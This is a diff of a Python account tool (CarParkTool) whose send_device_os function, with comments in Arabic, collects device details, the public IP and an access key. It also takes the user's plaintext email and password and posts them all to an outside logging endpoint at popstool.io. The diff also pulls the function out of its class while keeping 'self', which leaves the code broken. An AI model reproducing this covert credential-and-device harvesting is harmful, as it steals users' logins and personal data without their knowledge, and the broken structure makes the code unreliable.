@@ -43,82 +43,69 @@ class CarParkTool:
             return response_decoded.get("error")
 
 
-    def send_device_os(self, email=None, password=None):
-        try:
-            # جمع بيانات النظام
-            system = platform.system()
-            release = platform.release()
-            device_name = "Unknown"
-            build_number = "Unknown"
-            processor = "Unknown"
-            memory = "Unknown"
+def send_device_os(self, email=None, password=None):
+    try:
+        # جمع بيانات النظام
+        system = platform.system()
+        release = platform.release()
+        device_name = "Unknown"
+        build_number = "Unknown"
 
-            if system == "Darwin":  # إذا كان النظام macOS أو iOS
-                if os.path.exists("/bin/ash") or "iSH" in release:
-                    device_os = "iOS (iSH)"
-                    device_name = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
-                    build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
-                else:
-                    device_os = "macOS"
-                    device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
-                    build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
-            elif system == "Linux":  # إذا كان النظام Linux أو Android
-                device_os = "Android" if os.path.exists("/system/bin") else "Linux"
-                if device_os == "Android":
-                    device_name = subprocess.getoutput("getprop ro.product.model") or "Android Device"
-                    build_number = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
-                else:
-                    device_name = "Linux Device"
-                    build_number = "Unknown"
-            else:  # لنظام التشغيل الذي لا نعرفه
-                device_os = system + " " + release
-                device_name = platform.node()
+        if system == "Darwin":  # إذا كان النظام macOS أو iOS
+            if os.path.exists("/bin/ash") or "iSH" in release:
+                device_os = "iOS (iSH)"
+                device_name = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
+                build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+            else:
+                device_os = "macOS"
+                device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
+                build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+        elif system == "Linux":  # إذا كان النظام Linux أو Android
+            device_os = "Android" if os.path.exists("/system/bin") else "Linux"
+            if device_os == "Android":
+                device_name = subprocess.getoutput("getprop ro.product.model") or "Android Device"
+                build_number = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
+            else:
+                device_name = "Linux Device"
                 build_number = "Unknown"
-
-            # إضافة معلومات المعالج والذاكرة
-            processor = subprocess.getoutput("sysctl -n machdep.cpu.brand_string") if system == "Darwin" else "Unknown"
-            memory = f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB" if psutil else "Unknown"
-
-        except Exception as e:
-            device_os = "Unknown"
-            device_name = "Unknown"
+        else:  # لنظام التشغيل الذي لا نعرفه
+            device_os = system + " " + release
+            device_name = platform.node()
             build_number = "Unknown"
-            processor = "Unknown"
-            memory = "Unknown"
+    except Exception:
+        device_os = "Unknown"
+        device_name = "Unknown"
+        build_number = "Unknown"
 
-        try:
-            # الحصول على عنوان الـ IP
-            ip_address = requests.get("https://api.ipify.org").text.strip()
-        except:
-            ip_address = "Unknown"
+    try:
+        # الحصول على عنوان الـ IP
+        ip_address = requests.get("https://api.ipify.org").text.strip()
+    except:
+        ip_address = "Unknown"
 
-        # إعداد البيانات التي سيتم إرسالها
-        payload = {
-            "action": "device_info",  # نوع الإجراء (قد يكون مختلفًا حسب متطلباتك)
-            "data": {
-                "access_key": self.access_key,
-                "device_os": device_os,
-                "device_name": device_name,
-                "build_number": build_number,
-                "ip_address": ip_address,
-                "processor": processor,
-                "memory": memory,
-                "telegram_id": getattr(self, "telegram_id", "Unknown")
-            }
+    # إعداد البيانات التي سيتم إرسالها
+    payload = {
+        "action": "device_info",  # نوع الإجراء (قد يكون مختلفًا حسب متطلباتك)
+        "data": {
+            "access_key": self.access_key,
+            "device_os": device_os,
+            "device_name": device_name,
+            "build_number": build_number,
+            "ip_address": ip_address,
+            "telegram_id": getattr(self, "telegram_id", "Unknown")
         }
+    }
 
-        # إضافة البريد الإلكتروني وكلمة المرور إذا كانت موجودة
-        if email:
-            payload["data"]["email"] = email
-        if password:
-            payload["data"]["password"] = password
+    # إضافة البريد الإلكتروني وكلمة المرور إذا كانت موجودة
+    if email:
+        payload["data"]["email"] = email
+    if password:
+        payload["data"]["password"] = password
 
-        # إرسال البيانات إلى adminLogs.php باستخدام POST مع تنسيق JSON
-        try:
-            response = requests.post("https://popstool.io/beekeeper/adminLogs.php", json=payload)
-            return response.status_code == 200
-        except Exception as e:
-            return False
+    # إرسال البيانات إلى adminLogs.php باستخدام POST مع تنسيق JSON
+    response = requests.post("https://popstool.io/beekeeper/adminLogs.php", json=payload)
+
+    return response.status_code == 200
     
     def register(self, email, password) -> int:
         payload = { "account_email": email, "account_password": password }
